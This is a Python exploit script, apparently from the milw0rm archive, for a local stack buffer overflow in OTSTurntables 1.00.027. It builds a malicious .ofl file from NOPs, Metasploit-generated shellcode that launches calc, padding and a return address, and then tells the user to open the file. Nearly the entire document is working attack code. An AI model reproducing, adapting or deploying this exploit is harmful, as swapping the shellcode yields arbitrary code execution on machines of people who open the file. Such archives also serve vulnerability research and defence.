#  OTSTurntables 1.00.027 (.ofl) Local Stack Overflow Exploit
#  Discovered & exploited bY suN8Hclf
#  crimson.loyd@gmail.com, blacksideofthesun.linuxsecured.net
#  Tested on: Windows XP SP2 Polish Full patched
#  
#  Only 274 bytes for shellcode. Wanna more, exploit SEH !!!
#
#  Thanks to Myo and to everyone who knows what hacking really is 
#  Not for money dude, only for fun !!!

print "====================================================================="
print " OTSTurntables 1.00.027 (.ofl) Local Stack Overflow Exploit"
print " bY suN8Hclf (crimson.loyd@gmail.com)"
print "====================================================================="

nops = "\x90" * 4
ret = "\x75\x52\x46";   # call ebx

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode = (
	"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc9"
	"\x2c\xc9\x40\x83\xeb\xfc\xe2\xf4\x35\xc4\x8d\x40\xc9\x2c\x42\x05"
	"\xf5\xa7\xb5\x45\xb1\x2d\x26\xcb\x86\x34\x42\x1f\xe9\x2d\x22\x09"
	"\x42\x18\x42\x41\x27\x1d\x09\xd9\x65\xa8\x09\x34\xce\xed\x03\x4d"
	"\xc8\xee\x22\xb4\xf2\x78\xed\x44\xbc\xc9\x42\x1f\xed\x2d\x22\x26"
	"\x42\x20\x82\xcb\x96\x30\xc8\xab\x42\x30\x42\x41\x22\xa5\x95\x64"
	"\xcd\xef\xf8\x80\xad\xa7\x89\x70\x4c\xec\xb1\x4c\x42\x6c\xc5\xcb"
	"\xb9\x30\x64\xcb\xa1\x24\x22\x49\x42\xac\x79\x40\xc9\x2c\x42\x28"
	"\xf5\x73\xf8\xb6\xa9\x7a\x40\xb8\x4a\xec\xb2\x10\xa1\xdc\x43\x44"
	"\x96\x44\x51\xbe\x43\x22\x9e\xbf\x2e\x4f\xa8\x2c\xaa\x02\xac\x38"
	"\xac\x2c\xc9\x40"
    )
num = 276 - 4 - 160
buff = "\x41" * num

exploit = nops + shellcode + buff + ret
try:
    out_file = open("open_me.ofl",'w')
    out_file.write(exploit)
    out_file.close()
    raw_input("\nNow open open_me.ofl file to exploit bug!\n")
except:
    print "WTF?"

# milw0rm.com [2009-01-14]